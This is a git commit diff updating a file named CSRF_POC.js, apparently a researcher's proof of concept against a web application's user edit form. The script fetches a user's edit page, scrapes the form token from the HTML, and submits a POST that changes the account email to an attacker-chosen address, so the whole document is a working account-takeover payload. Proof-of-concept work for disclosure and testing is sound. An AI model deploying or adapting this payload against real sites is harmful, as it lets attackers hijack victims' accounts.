5ce4578ff05f52f19bafe105cc7ebb32fd8c0a33
Omar Essam <97185802+OmarE-G@users.noreply.github.com>
2023-12-30 15:33:03 +0200

    Update CSRF_POC.js

--- CSRF_POC.js
+++ CSRF_POC.js
@@ -1,19 +1,18 @@
-
 var csrfToken;
-var username = omargad92;
-fetch('/users/${username}/edit')
+var username = "omargad92";
+fetch('/users/' + username +'/edit')
   .then(r => r.text())
   .then(d => {
     csrfToken = (new DOMParser().parseFromString(d, 'text/html').querySelector('[id="edit-user-personal-info-form-form-token"]') || {}).value;
             
-        const email = 'hacked@hacker.com';
+        const email = 'hacked@byomar.com';
         const op = 'Save';
         const formData = new FormData();
         formData.append('mail', email);
         formData.append('op', op);
         formData.append('form_token', csrfToken);
         formData.append('form_id', 'user_personal_info_form');
-        fetch('/users/${username}/edit', {
+        fetch('/users/' +username +'/edit', {
         method: 'POST',
         body: formData,
         })
